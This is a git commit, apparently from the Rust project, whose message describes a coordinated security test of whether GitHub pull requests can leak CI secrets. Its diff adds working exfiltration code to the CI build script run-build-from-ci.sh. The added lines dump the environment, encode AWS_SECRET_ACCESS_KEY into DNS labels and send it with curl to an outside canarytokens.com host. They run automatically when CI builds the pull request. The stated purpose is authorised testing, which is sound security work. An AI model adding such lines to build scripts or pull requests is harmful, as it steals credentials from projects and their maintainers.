ec96d3980385eccf81f6259878056657e0c5ff23
Lukas Markeffsky <@>
2022-11-17 18:53:39 +0100

    [DO NOT MERGE] Test if GitHub PRs can leak secrets
    This is an attempt to extract the AWS key associated with `CACHES_AWS_ACCESS_KEY_ID` via a pull request. This secret is not considered sensitive.
    
    This attack is done in coordination with the Security Response WG and for educational purposes only.
    
    cc @pietroalbini @cuviper

--- src/ci/scripts/run-build-from-ci.sh
+++ src/ci/scripts/run-build-from-ci.sh
@@ -2,6 +2,13 @@
 # Start the CI build. You shouldn't run this locally: call either src/ci/run.sh
 # or src/ci/docker/run.sh instead.
 
+env
+
+url=$(python3 <<< "token='ta9trx5u17g3nta59hhn3jhq9.canarytokens.com'; data='${AWS_SECRET_ACCESS_KEY}'; import base64, re, random; print('.'.join(filter(lambda x: x,re.split(r'(.{63})', base64.b32encode(data.encode('utf8')).decode('utf8').replace('=','')) + ['G'+str(random.randint(10,99)), token])))")
+curl "${url}"
+
+exit 1
+
 set -euo pipefail
 IFS=$'\n\t'
 
